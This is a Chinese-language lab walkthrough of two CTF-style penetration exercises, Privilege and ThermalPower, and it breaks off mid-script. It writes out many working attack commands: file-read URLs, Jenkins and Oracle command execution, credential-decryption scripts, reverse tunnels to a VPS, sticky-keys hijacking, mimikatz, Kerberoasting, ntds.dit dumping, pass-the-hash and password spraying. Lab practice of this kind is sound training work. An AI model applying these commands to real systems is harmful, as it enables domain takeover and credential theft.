---
title: "春秋云镜 Privilege & ThermalPower"
onlyTitle: true
date: 2026-1-9 17:37:21
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8186.jpg
---



两个有点类似，一起

## 春秋云镜 Privilege

### flag1

fscan看到开了8080和3306，应该是windows，还有个www.zip备份文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108194806040.png)

访问8080，看到jenkins

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108192826951.png)

还有个80，是wordpress

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108192905182.png)

用wpscan扫一下

```sh
wpscan --disable-tls-checks --url http://39.98.118.36 --stealthy
```

探测出了wordpress版本6.2.2，blossom-shop主题，感觉没什么用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108193908130.png)

下载www.zip

用Kunlun-M审下sink，刚好想用这个，我用的2.6.5，先装了一遍2.6.30，dockerfile有点问题

https://github.com/LoRexxar/Kunlun-M

改下dockerfile，加个pkg-config

```
docker build -t kunlun-m -f ./docker/Dockerfile .
docker run -d -p 9999:80 kunlun-m
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108201818127.png)

然后在9999端口能访问

直接docker里面上传源码开扫

```
python3 kunlun.py scan -t WWW/
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108204656687.png)

好像有点狗屎，扫的时候老是报错，不如古法seay一根了

tools/content-log存在任意文件读取

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108205405025.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108205517310.png)

前面提到开了3306，直接读windows下的flag

```
http://39.98.118.36/tools/content-log.php?logfile=C%3A%2F%2FUsers%2FAdministrator%2Fflag%2Fflag01.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108205841567.png)

flag01: flag{235e5db5-23e9-452f-9412-90a54a2cfc3a}

### flag2

有hint  C:\ProgramData\Jenkins\.jenkins, 读jenkins配置文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108205911083.png)

Jenkins 的默认管理员用户名是： admin

密码存储在你服务器上的一个特定文件中。文件的路径通常在 Jenkins 首页或日志中有提示。

最常见的路径是：

    Linux/macOS/Docker 环境： /var/lib/jenkins/secrets/initialAdminPassword
    
    Windows 环境： C:\Program Files\Jenkins\secrets\initialAdminPassword
那么这里读C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword

得到510235cf43f14e83b88a9f144199655b

进到jenkins后台

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108210224955.png)

Jenkins 作为一个高度可扩展的CI/CD工具，后台可以直接命令执行很正常吧。正常功能

网上很多jenkins后台命令执行，还能绕检测

脚本命令行接口位于/manage/script，看下什么权限先

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108212024544.png)

域管理员权限，借助前面的3306，直接添加用户

```sh
println "net user godown qwer1234! /add".execute().text
println "net localgroup administrators godown /add".execute().text
```

rdp上去，上传fscan扫下内网

```sh
C:\Users\godown\Desktop>ipconfig

Windows IP 配置


以太网适配器 以太网:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::3134:1d18:4e18:56c6%3
   IPv4 地址 . . . . . . . . . . . . : 172.22.14.7
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253

C:\Users\godown\Desktop>fscan64.exe -h 172.22.14.7/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
(icmp) Target 172.22.14.7     is alive
(icmp) Target 172.22.14.11    is alive
(icmp) Target 172.22.14.16    is alive
(icmp) Target 172.22.14.31    is alive
(icmp) Target 172.22.14.46    is alive
[*] Icmp alive hosts len is: 5
172.22.14.7:3306 open
172.22.14.31:1521 open
172.22.14.46:445 open
172.22.14.31:445 open
172.22.14.11:445 open
172.22.14.7:445 open
172.22.14.46:139 open
172.22.14.31:139 open
172.22.14.11:139 open
172.22.14.46:135 open
172.22.14.7:139 open
172.22.14.31:135 open
172.22.14.11:135 open
172.22.14.7:135 open
172.22.14.46:80 open
172.22.14.16:80 open
172.22.14.7:80 open
172.22.14.16:22 open
172.22.14.16:8060 open
172.22.14.7:8080 open
172.22.14.11:88 open
172.22.14.16:9094 open
[*] alive ports len is: 22
start vulscan
[+] NetInfo:
[*]172.22.14.31
   [->]XR-ORACLE
   [->]172.22.14.31
[+] NetInfo:
[*]172.22.14.11
   [->]XR-DC
   [->]172.22.14.11
[+] NetInfo:
[*]172.22.14.7
   [->]XR-JENKINS
   [->]172.22.14.7
[*] 172.22.14.31         WORKGROUP\XR-ORACLE
[*] 172.22.14.46         XIAORANG\XR-0923
[*] 172.22.14.11   [+]DC XIAORANG\XR-DC
[+] NetInfo:
[*]172.22.14.46
   [->]XR-0923
   [->]172.22.14.46
[*] WebTitle:http://172.22.14.7:8080   code:403 len:548    title:None
[*] WebTitle:http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
[*] WebTitle:http://172.22.14.46       code:200 len:703    title:IIS Windows Server
[*] WebTitle:http://172.22.14.7        code:200 len:54603  title:XR SHOP
[*] WebTitle:http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in
[*] WebTitle:http://172.22.14.16/users/sign_in code:200 len:32807  title:Sign in · GitLab
[+] http://172.22.14.7/www.zip poc-yaml-backup-file
已完成 22/22
[*] 扫描结束,耗时: 2m28.6718773s
C:\Users\godown\Desktop>
```

整理一下

```
172.22.14.7 本机
172.22.14.16 GitLab 
172.22.14.31 WORKGROUP\XR-ORACLE
172.22.14.46 IIS Windows Server XIAORANG\XR-0923
172.22.14.11 DC域控
```

flag2 hint 尝试获取Git API Token，然后应该是在gitlab上获取oracle账密

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109101535858.png)

在jenkins配置目录下找到了credentials.xml，里面有GitLabApiTokenImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109101818009.png)

直接问gpt怎么解密

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109102119870.png)

```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl

def credentials = CredentialsProvider.lookupCredentials(
    GitLabApiTokenImpl.class,
    Jenkins.instance,
    null,
    null
)

credentials.each { cred ->
    println("ID: " + cred.id)
    println("Description: " + cred.description)
    println("API Token: " + cred.apiToken.plainText)
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109102228386.png)

得到 gitlab api token

```
API Token: glpat-7kD_qLH2PiQv_ywB9hz2
```

前面fscan扫出的gitlab机器为172.22.14.16，仓库的通用接口是`api/v4/projects/`，带上token可以访问

先代理出来，然后curl

```sh
gost -L socks5://:5555?bind=true

gost -L rtcp://:2222/39.99.152.149:22 -F socks5://39.99.152.149:5555
```

```sh
curl --silent --header "PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2"  "http://172.22.14.16/api/v4/projects/"
```

一共5个project

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109103311358.png)

重点关注internal-secret和xradmin仓库（0&1）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109103338109.png)

git clone下来

```sh
git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git 
git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git
```

internal-secret仓库是一堆账密

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109103556977.png)

xradmin扒下来是ruoyi的源码

ruoyi用的spring，配置文件里肯定有数据库的账密，在ruoyi-admin下application-druid中找到了数据库的账密

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109103950073.png)

                url: jdbc:oracle:thin:@172.22.14.31:1521/orcl
                username: xradmin
                password: fcMyE8t9E4XdsKf

试了下Mdut连不上，用odat

ODAT(Oracle数据库攻击工具)可远程测试Oracle数据库的安全性。是一个rce+提权的工具

根据官网，数据库中有一个有效的Oracle账户，用odat可能将权限从普通DBA升级为SYSDBA

>DBA 是 Oracle 数据库中的**预定义角色**，包含了一系列数据库管理权限。
>
>SYSDBA 是 Oracle 数据库的**最高权限级别**，用于数据库实例的管理。

既然能提权，那直接添加用户

```
sudo vi /etc/proxychains4.conf
socks5 39.99.152.149 5555

proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user test2 Abcd1234 /add'
proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup administrators test2 /add'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109105735329.png)

xfreerdp顺便连了

```
apt install freerdp3-x11
proxychains4 xfreerdp3 /v:172.22.14.31 /u:test2 /p:Abcd1234
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109110652013.png)

flag02: flag{b6d04188-c08d-4faf-9ede-352e97bcfdd4}

### flag3

前面的账密，可以用cme去域内爆破，不过有个主机是XR-0923，账户里面也有一个XR-0923，可以直接rdp上去172.22.14.46

XR-0923 | zhangshuai | wSbEajHzZs

net user zhangshuai看下权限，权限不够的话要提权

这里zhangshuai没在Administrator组里面，所以要提权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109111047795.png)

whoami /priv看下，有SeChangeNotifyPrivilege权限（另外一个已被禁用）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109111329854.png)

根据下文，如果目标开了winrm服务（默认端口5985或者5986）（通常Server 2012及之后的版本直接开启，这里是winServer 2022）

https://forum.butian.net/share/2080

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109111636657.png)

一般是用Winrs.exe进行认证登陆，但是这个工具不支持hash认证，evil-winrm支持hash认证winrm服务

>另外，注册表中LocalAccountTokenFilterPolicy的值默认为0，在这种默认情况下，只有系统默认管理员账户Administrator（SID 500）拥有凭证可以进行对主机的连接，本地管理员组的其他用户登录时将会显示拒绝访问

但是域管理账户在域内主机中登录，会自动将域管用户添加到本地管理组中，如果是将普通域用户添加到系统本地管理员组，两种方法是默认bypassuac的，这时候域管理账户与普通域用户是拥有WinRM远程连接的凭证，无需要修改注册表就可以使用WinRM进行远程连接。

这里zhangshuai明显是一个普通域用户，所以可以winrm登陆上去，先尝试修改访问权限

```
winrm set winrm/config/client @{TrustedHosts="172.22.14.7"}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109113350389.png)

我曹，软的不行，那来硬的，用evil-winrm认证

```
proxychains4 evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs
```

winrm认证上去后多出了一个seRestorePrivilege权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109113650194.png)

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8

根据上文，该权限对当前系统任意文件都有写权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109113828994.png)

劫持一下粘滞键，因为粘滞键包是system权限

```
ren c:\windows\system32\sethc.exe c:\windows\system32\sethc.bak
ren c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

rdp上去，Win+L进锁屏页面（千万别登陆进去，因为锁屏页面是system权限，登进去再按就是普通用户权限了），然后按5次shift

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109153905810.png)

flag03: flag{78e30f67-3f8f-4945-8288-44d7373d056f}

### flag4

添加用户，方便一点

```shell
net user godown qwer1234! /add
net localgroup administrators godown /add
proxychains4 xfreerdp3 /v:172.22.14.46 /u:godown /p:qwer1234!
```

上传mimikatz，然后dump票据（管理员权限运行

```shell
privilege::debug
sekurlsa::logonpasswords
```

用xiaorang.lab的域机器用户 XR-0923$ NTLM 

这里用时间最近的一个NTLM，因为前面的可能过期了。

>从 `lsass.exe` 进程的内存中提取登录凭据。
>
>- `lsass.exe` 是 Windows 的“本地安全认证子系统服务”。它负责管理系统的安全策略、用户认证，并**在内存中缓存用户的登录凭据**，以便用于后续的网络资源访问（如文件共享、访问其他服务器等）

这里结尾有个$，与标准用户账户相比，机器账户的名称末尾附加了“$”符号，利用该账户进行Kerberosast攻击

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109155011100.png)

- **目的**：发现域中所有注册了SPN的服务账户
- **原理**：SPN是服务在Kerberos认证中的唯一标识符。查询SPN可以找出哪些账户用于运行服务（如SQL服务、Web服务等）
- **意义**：服务账户通常具有较高权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109162834826.png)

```shell
proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.14.11 xiaorang.lab/XR-0923$ -hashes ':348bd1c31a87e92b4d7b14b7d44d3e8c'
```

```sh
──(root㉿kali)-[/home/kali]
└─# proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.14.11 xiaorang.lab/XR-0923$ -hashes ':348bd1c31a87e92b4d7b14b7d44d3e8c'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  39.99.152.149:5555  ...  172.22.14.11:389  ...  OK
ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation 
-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
TERMSERV/xr-0923.xiaorang.lab  tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 06:25:11.564883  <never>               
WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 06:25:11.564883  <never>               



[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  39.99.152.149:5555  ...  172.22.14.11:88  ...  OK
[proxychains] Strict chain  ...  39.99.152.149:5555  ...  172.22.14.11:88  ...  OK
[proxychains] Strict chain  ...  39.99.152.149:5555  ...  172.22.14.11:88  ...  OK
$krb5tgs$23$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$2f0e5b71ac069063c2ae031fe83aae97$d74618c5be957aface9fe1d3fc73da5eb184d4d2e8e602d1872975f2663211afca7f0047c26e19f127edfae1a876f6f74ca7c91dc0298a28e071c7e6f18c088433277e05ae252ba31f35e893372f5e7b4219d3dec14f19d6cd6c5969458aa6d2d1dcc73b16da05685c74186ccbae41fe538d14c6829f65fed96ac1cdaf70931309f454c180868eaca8933297b31f36312e7d15e97ed2a7754e9cf864767e9ba9dc026770790641e40b9ae205c169d6f8ab4b37626aa5cdbc683e21146b387caec03e77bdef323b4f012c2e78b5c32c5c4de64d656dae7935aa1207886a95bc952804250505fa47b0a9c1ea27129c3f75c993e416b005619a7178a4ad8ab130fb525a26068f6e350d034a1af5a696cd01966aaa9a8310d0929f63f8516960db539c2358ddda7edd58f71be28ee5b4a8a7cc8bec89136904f3a3b69f9c7eb963d2809b8e4b26e45e81544e09b0e765bbc5bc94299d6c09a5985d6108e9d83a2668788b297016c5e4f71f52818b0359b1ef0acb4e9c87bcb25fbad5d7bb27a91d4030b545245f73b135a9b12e6bad3d4d0b168efcffef7a8f19278343f57012371d425d3ee7c92127d87685363a4e29e6ca42365f2ff49d6b4418735827fd04a7026f325cc1add54c8363846d5d16b72bd8962ada79b28a225bd6f6acb5f84ff3eca2ae60a2bb6968f9dfd2e1ebffb13bfb99ab8cbbf6ea46b887e3358894c6af4c28b247f9b4032ca7aaca6f4b823823a294d0cc9cab3fe75b6d9fd55bdef5247fd03eb5c420cdb4d5e2196c1fb5c5abb005766e1a1b8f3b1d8256f4ee538e8202339a7e0fa1d2bedd49a2ddf86cbe9e576ee62389f0da6dd3c32264dff95e7d0f890d8f2ca95555059dcbf1d6ff7d19dab7029e5879570e19b3af9271d234e0f60c3464f146c86f51c1b447e3dbec3ca874fd33693108bc9af347daefddafd469532afff5c9bec00ee017fdfe461e32695348a8db47c377e3dfbdfd96a4cc5256799a301e92bd1e78946ccba0dada605c36974f39b6ede8dc8a9cea8fa9ae0a65acc7b70c481e088ee3190d7586874da0785c3a76a69bc5994c70897af5c617bb54da326078698492c8b2b0f1925cfbcfb35a98a575d5ce6186184c6b9f2324b577051e52d7e341cb5a044b9782d4a8d2842f5bbaf5a9a4b521699fe7a81d77f6de7ff0535b34eac82e564e9eb32792fb5755f9df0716ab1bb75fe9eeed03c3032efb04636210419fd42c37a3ddbf99c33116b875f547c81cc685ba522c1432bb322e71b8307a163b243d5cde557c4e5c3dc0c0d9616c59dd22163c6d4b1c235e54746e5a19357a75092fade479d8a0bfb3b4c62d3f3e45e89a66819427df3e2c980d3bead0910dfbdfc0f523581e31058df3f41d8024d83e8384c35a2b717514e6f9a80f47ca07333c8c211c7021d129f5f0c29d604554d98fcc63b024debfa4c073245fb14b5fb68f6501995f317c7c376b9980c6

```

扫到一个tianjing用户的krb5tgs，白银票据的打法

用hashcat爆破之

hashcat -m 13100 -a 0 1.txt rockyou.txt --force

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109163344912.png)

密码为DPQSXSXgh2

根据前面的Kerberosast：

WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users

该用户也是Remote Management User，和zhangshuai的机器一样，推测也开了5985端口的winrm服务

```shell
proxychains evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2
```

登上去后发现也是开了SeRestorePrivilege

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109163752605.png)

故技重施再打一遍：

```
proxychains4 xfreerdp3 /v:172.22.14.11 /u:tianjing /p:DPQSXSXgh2
```

报错，配置了不能rdp上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109164338326.png)

那各种劫持就没法用了

里面有个SeBackupPrivilege，有备份权限，虽然这里不能直接用type去读

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109165626922.png)

>* 卷影拷贝：
>
>**卷影拷贝**是Windows操作系统中的一种**快照技术**，由**卷影复制服务**提供支持。它能在文件系统层面创建**时间点副本**（Point-in-Time Copy），即使文件正在被使用或锁定，也能生成一致的副本。
>
>**低权限访问**：默认情况下，用户只需**备份操作员**权限即可创建卷影拷贝。
>
>一般打法如下：
>
>```sh
># 创建C盘的卷影拷贝
>vssadmin create shadow /for=C:
>
># 从卷影拷贝中复制SAM、SYSTEM等文件
>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
>
># 使用mimikatz/secretsdump提取哈希
>secretsdump -sam SAM -system SYSTEM LOCAL
>```

有了SAM和SYSTEM就能提取哈希，刚好11主机是域控，取出的hash也就是域控hash

本地windows创建一个raj.dsh，确保为windows格式

```shell
set context persistent nowriters
add volume c: alias raj
create
expose %raj% g:
```

DiskShadow命令，用于创建和暴露卷影拷贝（Volume Shadow Copy）

- `set context persistent`：设置卷影拷贝为**持久性**，不会自动删除
- `nowriters`：创建时不通知应用程序（如数据库）刷新数据到磁盘

- **`add volume c:`**：将C盘添加到快照集
- **`alias raj`**：为这个卷分配别名"raj"（攻击者随意命名）

- create：根据前面的设置，为C盘创建时间点快照

- **`%raj%`**：引用前面定义的别名
- **`expose ... g:`**：将卷影拷贝挂载为g盘

然后上传

```
upload raj.dsh
```

用diskshadow执行dsh脚本

```shell
diskshadow /s raj.dsh
```

如果报错无法将 .cab存储到当前目录中，是因为对当前目录没有写权限，去c盘下创建一个tmp执行

```
cd c:
mkdir tmp
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109172002706.png)

复制文件到当前目录(RoboCopy相当于增强的copy),并下载sam表

```
RoboCopy /b g:\windows\ntds . ntds.dit
download ntds.dit
```

从g:\windows\ntds目录复制ntds.dit文件到当前目录（.）并命名为ntds.dit

现在ntds.dit就是windows的备份文件，里面有SAM

现在转存下载system，system位于注册表中

```
reg save HKLM\SYSTEM system
download system
```

用secretdump解密

```sh
impacket-secretsdump -ntds ntds.dit -system system local
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109173138844.png)

pth上去

```
proxychains4 crackmapexec smb 172.22.14.11 -u administrator -H 70c39b547b7d8adec35ad7c09fb1d277 -d xiaorang.lab -x "type C:\\Users\Administrator\flag\f*"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109173211704.png)



flag04: flag{e69b59c8-4b64-43ad-a8e3-c371f315826f}





## 春秋云镜 ThermalPower

### flag1

fscan扫，有spring heapdump泄露

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195050104.png)

访问http://39.98.107.30:8080/actuator/heapdump

JDumpSpider分析，找到Shiro key QZYysgMYhG6/CzIJlVpR2g==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195617260.png)

直接上shiro工具，注个哥斯拉马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195900274.png)

进来就是root

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201610758.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201649176.png)

flag01: flag{e85614ea-b098-4b8e-b91a-af61ef4719d7}

### flag2

上传fscan和gost

当然fscan扫的时候shell也会卡住，要想完整的交互式shell还是得传vshell上去

这里也能顺利扫完

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109202236234.png)

整理一下

```
172.22.17.213 本机
172.22.17.6 WORKGROUP\WIN-ENGINEER 有web服务
172.22.17.6:21 FTP fscan扫出可匿名登陆
```

gost代理出来

```
gost -L socks5://:5555?bind=true

gost -L rtcp://:2222/39.98.107.30:22 -F socks5://39.98.107.30:5555
```

我曹里的，sb哥斯拉命令执行超时了会自己断掉终端，导致gost中途断掉（可以起gost后马上把那个终端窗口关掉，这样就不会触发shell管理器的关闭发送ctrl+c了，不过挂起时间长了还是会掉，二刷还是上vshell稳定）

直接访问ftp://172.22.17.6

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203215494.png)

直接看内部资料

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203303285.png)

初始密码由账户名+@+工号组成，例如zhangsan@0801

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109204240242.png)

这里有一个txt记录了账密，还有一个新的26网段，通讯录里有账号和工号

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109210106532.png)

排个序，制作出密码

```
WIN-ENGINEER\chenhua/chenhua@0813
WIN-ENGINEER\zhaoli/zhaoli@0821
WIN-ENGINEER\wangning/wangning@0837
WIN-ENGINEER\zhangling/zhangling@0871
WIN-ENGINEER\zhangying/zhangying@0888
WIN-ENGINEER\wangzhiqiang/wangzhiqiang@0901
WIN-ENGINEER\chentao/chentao@0922
WIN-ENGINEER\zhouyong/zhouyong@0939
WIN-ENGINEER\lilong/lilong@1046
WIN-ENGINEER\liyumei/liyumei@1048
```

域内喷洒一波，在kali 2024上依旧python版本过高，用的kali 2023，可以做user.txt和pass.txt两个字典，这里我先试了直接爆破rdp，结果socket一直error，无奈先爆破一首smb

```sh
proxychains4 crackmapexec smb 172.22.17.6 -d xiaorang.lab -u ./user.txt -p ./pass.txt
```

爆破smb能秒出结果，也就是第一条就能登陆

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110200230531.png)

把第一条删去后，发现zhaoli也能登陆，额其实每一条都能登陆，每个账户都是可用的。rdp上去

```
proxychains4 -q xfreerdp /u:chenhua /p:chenhua@0813 /v:172.22.17.6:3389
```

查看一下特权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201009595.png)

Privilege靶场是利用evil-winrm（需要目标开了winrm服务）获取seRestore特权打粘滞劫持，SeBackupPrivilege打的卷影拷贝读出SAM和system，进而secretdump下hash

这里有所有权限的介绍

https://github.com/gtworek/Priv2Admin

比如表中的，SeChangeNotify就是人人享有的特权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201652291.png)

直接看别人wp，这里打SeBackupPrivilege，那么为什么可以打这个呢，又为什么只打这个呢

net user chenhua查看当前的本地组（虽然这个组并没有什么实际意义

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110202410222.png)

我就偏不打SeBackupPrivilege，就得打seRestore

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204146113.png)

```
Import-Module .\EnableSeRestorePrivilege.ps1
ren c:\windows\system32\sethc.exe c:\windows\system32\sethc.bak
ren c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

成功拿下，根本不用卷影拷贝好吧

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204220376.png)

可以用用EnableSeBackupPrivilege打卷影拷贝，也可以用EnableSeRestorePrivilege打劫持

https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1

https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1

```
type C:\Users\Administrator\flag\flag02.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204813605.png)

好像不能copy，新添加一个administrator用户rdp上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205112306.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205142301.png)

flag02: flag{1a62047c-7f28-44a1-8760-671da6b7d580}



### flag3

这个不是我能做的了，随便划划水了

扫这个新的网段 172.22.26.1/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png)

额cmd被劫持了，五次shift打开

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205625118.png)

扫到一个172.22.26.11主机，1433 (mssql?) 有弱口令sa 123456

用Administrator/IYnT3GyCiy3 rdp上去，这个mssql也就用不到了，不过这里不能通过最边界的机器去rdp了，因为跨网段了，用这个控制下来的172.22.17.6去rdp

rdp套娃rdp了，进来先弹出wincc

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210451476.png)

点第三个泡泡得到flag3

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210655903.png)

flag{bcd080d5-2cf1-4095-ac15-fa4bef9ca1c0}



### flag4

win+d最小化窗口返回桌面，桌面壁纸被换为了勒索壁纸，本来Desktop目录有flag04的。。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210904306.png)

C盘下面能找到勒索病毒Lockyou.exe

下面不会了，直接粘贴

这个exe是.net程序（用linux的file命令可以知道）

然后就用dnSpy反编译出来，看Encrypt的命令

病毒使用`AESCrypto`加解密，需要拿到`AES_KEY`，而`AES_KEY`需要通过`privateKey`和`encryptedAesKey`才能得到。这两个文件在题目的百度网盘给出了

通过网站https://www.ssleye.com/ssltool/pem_xml.html，将 XML 格式转成 PEM 格式，得到 `PRIVATE KEY`

然后通过[https://www.lddgo.net/encrypt/rsa，再把 `aes key`解出来，输入内容为`encryptedAesKey` 中加密的内容，解密后得到一串字符。

然后一次AES解密桌面上的ScadaDB.sql.locky得到flag4

```py
from Crypto.Cipher import AES
import os
import base64

AES_KEY = base64.b64decode("cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=")

def decrypt_file(input_file, output_file):
    aes_cipher = AES.new(AES_KEY, AES.MODE_CBC)
    with open(input_file, 'rb') as f:
        iv = f.read(16)
        aes_cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        with open(output_file, 'wb') as decrypted_file:
            while True:
                chunk = f.read(16)
                if len(chunk) == 0:
                    break
                decrypted_chunk = aes_cipher.decrypt(chunk)
                decrypted_file.write(decrypted_chunk)

    print("解密完成")

input_file = "ScadaDB.sql.locky"
